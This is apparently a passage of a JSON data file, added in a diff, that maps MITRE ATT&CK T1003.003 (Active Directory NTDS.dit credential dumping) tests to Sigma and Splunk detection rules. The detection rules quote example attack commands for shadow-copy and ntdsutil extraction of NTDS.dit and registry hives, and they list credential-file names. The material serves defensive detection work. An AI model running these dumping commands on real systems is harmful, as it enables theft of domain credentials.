+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_sensitive_file_access_shadowcopy.yml",
+                        "remote_content": "title: Sensitive File Access Via Volume Shadow Copy Backup\nid: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d\nstatus: test\ndescription: |\n    Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816?s=20\n    - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection\n    - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\nauthor: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021-08-09\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        # copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2>&1\n        # There is an additional \"\\\" to escape the special \"?\"\n        CommandLine|contains: '\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy'\n    selection_2:\n        CommandLine|contains:\n            - '\\\\NTDS.dit'\n            - '\\\\SYSTEM'\n            - '\\\\SECURITY'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Process Patterns NTDS.DIT Exfil",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntds.yml",
+                        "remote_content": "title: Suspicious Process Patterns NTDS.DIT Exfil\nid: 8bc64091-6875-4881-aaf9-7bd25b5dda08\nstatus: test\ndescription: Detects suspicious process patterns used in NTDS.DIT exfiltration\nreferences:\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/\n    - https://pentestlab.blog/tag/ntds-dit/\n    - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1\n    - https://github.com/zcgonvh/NTDSDumpEx\n    - https://github.com/rapid7/metasploit-framework/blob/d297adcebb5c1df6fe30b12ca79b161deb71571c/data/post/powershell/NTDSgrab.ps1\n    - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-11\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_tool:\n        # https://github.com/zcgonvh/NTDSDumpEx\n        - Image|endswith:\n              - '\\NTDSDump.exe'\n              - '\\NTDSDumpEx.exe'\n        - CommandLine|contains|all:\n              # ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv\n              - 'ntds.dit'\n              - 'system.hiv'\n        - CommandLine|contains: 'NTDSgrab.ps1'\n    selection_oneliner_1:\n        # powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\"\n        CommandLine|contains|all:\n            - 'ac i ntds'\n            - 'create full'\n    selection_onliner_2:\n        # cmd.exe /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit\n        CommandLine|contains|all:\n            - '/c copy '\n            - '\\windows\\ntds\\ntds.dit'\n    selection_onliner_3:\n        # ntdsutil \"activate instance ntds\" \"ifm\" \"create full c:\\windows\\temp\\data\\\" \"quit\" \"quit\"\n        CommandLine|contains|all:\n            - 'activate instance ntds'\n            - 'create full'\n    selection_powershell:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'ntds.dit'\n    set1_selection_ntds_dit:\n        CommandLine|contains: 'ntds.dit'\n    set1_selection_image_folder:\n        - ParentImage|contains:\n              - '\\apache'\n              - '\\tomcat'\n              - '\\AppData\\'\n              - '\\Temp\\'\n              - '\\Public\\'\n              - '\\PerfLogs\\'\n        - Image|contains:\n              - '\\apache'\n              - '\\tomcat'\n              - '\\AppData\\'\n              - '\\Temp\\'\n              - '\\Public\\'\n              - '\\PerfLogs\\'\n    condition: 1 of selection* or all of set1*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Copy From VolumeShadowCopy Via Cmd.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_shadowcopy_access.yml",
+                        "remote_content": "title: Copy From VolumeShadowCopy Via Cmd.EXE\nid: c73124a7-3e89-44a3-bdc1-25fe4df754b1\nstatus: test\ndescription: Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816?s=20\n    - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection\n    - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\nauthor: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021-08-09\nmodified: 2023-03-07\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\\n        # There is an additional \"\\\" to escape the special \"?\"\n        CommandLine|contains|all:\n            - 'copy '\n            - '\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Backup scenarios using the commandline\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Attempted Credential Dump From Registry via Reg exe",
+                        "rule_link": "https://research.splunk.com/endpoint/e9fb4a59-c5fb-440a-9f24-191fbc6b2911/"
+                    },
+                    {
+                        "rule_name": "Credential Dumping via Copy Command from Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/d8c406fe-23d2-45f3-a983-1abe7b83ff3b/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f",
+                "atomic_attack_name": "Create Volume Shadow Copy with vssadmin",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Shadow Copies Creation Using Operating Systems Utilities",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml",
+                        "remote_content": "title: Shadow Copies Creation Using Operating Systems Utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nstatus: test\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n              - '\\wmic.exe'\n              - '\\vssadmin.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n              - 'wmic.exe'\n              - 'VSSADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'shadow'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Creation of Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/eb120f5f-b879-4a63-97c1-93352b5df844/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "542bb97e-da53-436b-8e43-e0a7d31a6c24",
+                "atomic_attack_name": "Create Volume Shadow Copy with Powershell",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Shadow Copies Creation Using Operating Systems Utilities",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml",
+                        "remote_content": "title: Shadow Copies Creation Using Operating Systems Utilities\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nstatus: test\ndescription: Shadow Copies creation using operating systems utilities, possible credential access\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n              - '\\wmic.exe'\n              - '\\vssadmin.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n              - 'wmic.exe'\n              - 'VSSADMIN.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'shadow'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.003",
+                "atomic_attack_guid": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
+                "atomic_attack_name": "Dump Active Directory Database with NTDSUtil",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Process Patterns NTDS.DIT Exfil",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntds.yml",
+                        "remote_content": "title: Suspicious Process Patterns NTDS.DIT Exfil\nid: 8bc64091-6875-4881-aaf9-7bd25b5dda08\nstatus: test\ndescription: Detects suspicious process patterns used in NTDS.DIT exfiltration\nreferences:\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/\n    - https://pentestlab.blog/tag/ntds-dit/\n    - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1\n    - https://github.com/zcgonvh/NTDSDumpEx\n    - https://github.com/rapid7/metasploit-framework/blob/d297adcebb5c1df6fe30b12ca79b161deb71571c/data/post/powershell/NTDSgrab.ps1\n    - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-11\nmodified: 2022-11-10\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_tool:\n        # https://github.com/zcgonvh/NTDSDumpEx\n        - Image|endswith:\n              - '\\NTDSDump.exe'\n              - '\\NTDSDumpEx.exe'\n        - CommandLine|contains|all:\n              # ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv\n              - 'ntds.dit'\n              - 'system.hiv'\n        - CommandLine|contains: 'NTDSgrab.ps1'\n    selection_oneliner_1:\n        # powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\"\n        CommandLine|contains|all:\n            - 'ac i ntds'\n            - 'create full'\n    selection_onliner_2:\n        # cmd.exe /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit\n        CommandLine|contains|all:\n            - '/c copy '\n            - '\\windows\\ntds\\ntds.dit'\n    selection_onliner_3:\n        # ntdsutil \"activate instance ntds\" \"ifm\" \"create full c:\\windows\\temp\\data\\\" \"quit\" \"quit\"\n        CommandLine|contains|all:\n            - 'activate instance ntds'\n            - 'create full'\n    selection_powershell:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'ntds.dit'\n    set1_selection_ntds_dit:\n        CommandLine|contains: 'ntds.dit'\n    set1_selection_image_folder:\n        - ParentImage|contains:\n              - '\\apache'\n              - '\\tomcat'\n              - '\\AppData\\'\n              - '\\Temp\\'\n              - '\\Public\\'\n              - '\\PerfLogs\\'\n        - Image|contains:\n              - '\\apache'\n              - '\\tomcat'\n              - '\\AppData\\'\n              - '\\Temp\\'\n              - '\\Public\\'\n              - '\\PerfLogs\\'\n    condition: 1 of selection* or all of set1*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "2e69f167-47b5-4ae7-a390-47764529eff5",
+                    "910ab938-668b-401b-b08c-b596e80fdca5",
+                    "2afafd61-6aae-4df4-baed-139fa1f4c345",
+                    "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                    "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                    "d3b70aad-097e-409c-9df2-450f80dc476b",
+                    "8bc64091-6875-4881-aaf9-7bd25b5dda08",
+                    "edf91964-b26e-4b4a-9600-ccacd7d7df24",
+                    "4e7050dd-e548-483f-b7d6-527ab4fa784d",
+                    "3a8da4e0-36c1-40d2-8b29-b3e890d5172a",
+                    "a58353df-af43-4753-bad0-cd83ef35eef5",
+                    "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                    "b140afd9-474b-4072-958e-2ebb435abd68",
+                    "7df1713a-1a5b-4a4b-a071-dc83b144a101",
+                    "11b1ed55-154d-4e82-8ad7-83739298f720",
+                    "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee",
+                    "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                    "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                    "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                    "afd12fed-b0ec-45c9-a13d-aa86625dac81"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "2e69f167-47b5-4ae7-a390-47764529eff5",
+                        "lookup_data": {
+                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
+                            "raw": "author: '@neu5ron, Teymur Kheirkhabarov, oscd.community'\ndate: 2020/04/02\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    name:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 2e69f167-47b5-4ae7-a390-47764529eff5\nlevel: medium\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 910ab938-668b-401b-b08c-b596e80fdca5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares - Zeek\n",
+                            "sigma:id": "2e69f167-47b5-4ae7-a390-47764529eff5",
+                            "title": "Transferring Files with Credential Data via Network Shares - Zeek",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "910ab938-668b-401b-b08c-b596e80fdca5",
+                        "lookup_data": {
+                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    RelativeTargetName|contains:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 910ab938-668b-401b-b08c-b596e80fdca5\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/30\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 2e69f167-47b5-4ae7-a390-47764529eff5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares\n",
+                            "sigma:id": "910ab938-668b-401b-b08c-b596e80fdca5",
+                            "title": "Transferring Files with Credential Data via Network Shares",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2afafd61-6aae-4df4-baed-139fa1f4c345",
+                        "lookup_data": {
+                            "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)",
+                            "raw": "author: Thomas Patzke\ndate: 2019/01/16\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks\n  against the NTDS database (NTDS.DIT)\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\ntdsutil.exe\nfalsepositives:\n- NTDS maintenance\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/11\nreferences:\n- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\n",
+                            "sigma:id": "2afafd61-6aae-4df4-baed-139fa1f4c345",
+                            "title": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                        "lookup_data": {
+                            "description": "Shadow Copies storage symbolic link creation using operating systems utilities",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Shadow Copies storage symbolic link creation using operating systems\n  utilities\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - mklink\n    - HarddiskVolumeShadowCopy\nfalsepositives:\n- Legitimate administrator working with shadow copies, access for backup purposes\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\ntitle: Shadow Copies Access via Symlink\n",
+                            "sigma:id": "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                            "title": "Shadow Copies Access via Symlink",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                        "lookup_data": {
+                            "description": "Files with well-known filenames (sensitive files with credential data) copying",
+                            "raw": "author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Files with well-known filenames (sensitive files with credential data)\n  copying\ndetection:\n  condition: all of selection_esent_* or selection_susp_paths\n  selection_esent_cli:\n    CommandLine|contains:\n    - vss\n    - ' /m '\n    - ' /y '\n  selection_esent_img:\n  - Image|endswith: \\esentutl.exe\n  - OriginalFileName: \\esentutl.exe\n  selection_susp_paths:\n    CommandLine|contains:\n    - \\windows\\ntds\\ntds.dit\n    - \\config\\sam\n    - \\config\\security\n    - '\\config\\system '\n    - \\repair\\sam\n    - \\repair\\system\n    - \\repair\\security\n    - \\config\\RegBack\\sam\n    - \\config\\RegBack\\system\n    - \\config\\RegBack\\security\nfalsepositives:\n- Copying sensitive files for legitimate use (eg. backup) or forensic investigation\n  by legitimate incident responder or forensic invetigator\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\n- car.2013-07-001\n- attack.s0404\ntitle: Copying Sensitive Files with Credential Data\n",
+                            "sigma:id": "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                            "title": "Copying Sensitive Files with Credential Data",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d3b70aad-097e-409c-9df2-450f80dc476b",
+                        "lookup_data": {
+                            "description": "Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups.",
+                            "raw": "author: Furkan Caliskan (@caliskanfurkan_)\ndate: 2020/07/04\ndescription: Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups.\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\ditsnap.exe\n  - CommandLine|contains: ditsnap.exe\nfalsepositives:\n- Legitimate admin usage\nid: d3b70aad-097e-409c-9df2-450f80dc476b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://thedfirreport.com/2020/06/21/snatch-ransomware/\n- https://github.com/yosqueoy/ditsnap\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: DIT Snapshot Viewer Use\n",
+                            "sigma:id": "d3b70aad-097e-409c-9df2-450f80dc476b",
+                            "title": "DIT Snapshot Viewer Use",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8bc64091-6875-4881-aaf9-7bd25b5dda08",
+                        "lookup_data": {
+                            "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/11\ndescription: Detects suspicious process patterns used in NTDS.DIT exfiltration\ndetection:\n  condition: 1 of selection* or all of set1*\n  selection_oneliner_1:\n    CommandLine|contains|all:\n    - ac i ntds\n    - create full\n  selection_onliner_2:\n    CommandLine|contains|all:\n    - '/c copy '\n    - \\windows\\ntds\\ntds.dit\n  selection_onliner_3:\n    CommandLine|contains|all:\n    - activate instance ntds\n    - create full\n  selection_powershell:\n    CommandLine|contains|all:\n    - powershell\n    - ntds.dit\n  selection_tool:\n  - Image|endswith:\n    - \\NTDSDump.exe\n    - \\NTDSDumpEx.exe\n  - CommandLine|contains|all:\n    - ntds.dit\n    - system.hiv\n  - CommandLine|contains: NTDSgrab.ps1\n  set1_selection_image_folder:\n  - ParentImage|contains:\n    - \\apache\n    - \\tomcat\n    - \\AppData\\\n    - \\Temp\\\n    - \\Public\\\n    - \\PerfLogs\\\n  - Image|contains:\n    - \\apache\n    - \\tomcat\n    - \\AppData\\\n    - \\Temp\\\n    - \\Public\\\n    - \\PerfLogs\\\n  set1_selection_ntds_dit:\n    CommandLine|contains: ntds.dit\nfalsepositives:\n- Unknown\nid: 8bc64091-6875-4881-aaf9-7bd25b5dda08\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/10\nreferences:\n- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n- https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/\n- https://pentestlab.blog/tag/ntds-dit/\n- https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1\n- https://github.com/zcgonvh/NTDSDumpEx\n- https://github.com/rapid7/metasploit-framework/blob/d297adcebb5c1df6fe30b12ca79b161deb71571c/data/post/powershell/NTDSgrab.ps1\n- https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.003\ntitle: Suspicious Process Patterns NTDS.DIT Exfil\n",
+                            "sigma:id": "8bc64091-6875-4881-aaf9-7bd25b5dda08",
+                            "title": "Suspicious Process Patterns NTDS.DIT Exfil",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "edf91964-b26e-4b4a-9600-ccacd7d7df24",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1003.003",
+                            "mitre-cti:description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n",
+                            "mitre-cti:name": "NTDS",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ed Williams, Trustwave, SpiderLabs'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24', 'type': 'attack-pattern', 'created': '2020-02-11T18:42:35.572Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1003.003', 'url': 'https://attack.mitre.org/techniques/T1003/003'}, {'url': 'https://en.wikipedia.org/wiki/Active_Directory', 'description': 'Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018.', 'source_name': 'Wikipedia Active Directory'}, {'url': 'http://adsecurity.org/?p=1275', 'description': 'Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest. Retrieved February 3, 2015.', 'source_name': 'Metcalf 2015'}], 'modified': '2022-03-08T21:00:52.774Z', 'name': 'NTDS', 'description': 'Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\\\NTDS\\\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\\n\\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\\n\\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\\n\\n* Volume Shadow Copy\\n* secretsdump.py\\n* Using the in-built Windows tool, ntdsutil.exe\\n* Invoke-NinjaCopy\\n', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 